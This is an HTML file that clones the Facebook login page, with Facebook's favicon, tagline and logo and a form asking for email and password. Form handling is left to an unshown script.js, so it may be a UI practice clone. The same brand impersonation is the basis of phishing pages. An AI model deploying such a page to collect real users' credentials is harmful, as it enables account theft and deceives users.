<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/x-icon" href="https://www.facebook.com/favicon.ico">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>
    <div class="facebook-page">
        <div class="container">
            <div class="textbox">
                <img src="assets/4lCu2zih0ca.svg" alt="" class="logo">
                <p>Facebook helps you connect and share with the people in your life.</p>
            </div>
            <div class="login">
                <form id="login-form">
                 <input type="text" id="email" placeholder="example@gmail.com" required>
                 <input type="password" id="password" placeholder="Password" required>
                 <button type="submit" class="login">Login</button><a href="#">Forget Password ?</a>
                 <hr>
                 <button type="button" class="create-account" id="signup-btn">Create New Account</button>
                </form>
                <p><a href="#">Create a Page</a>for a celebrity, brand or business.</p>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
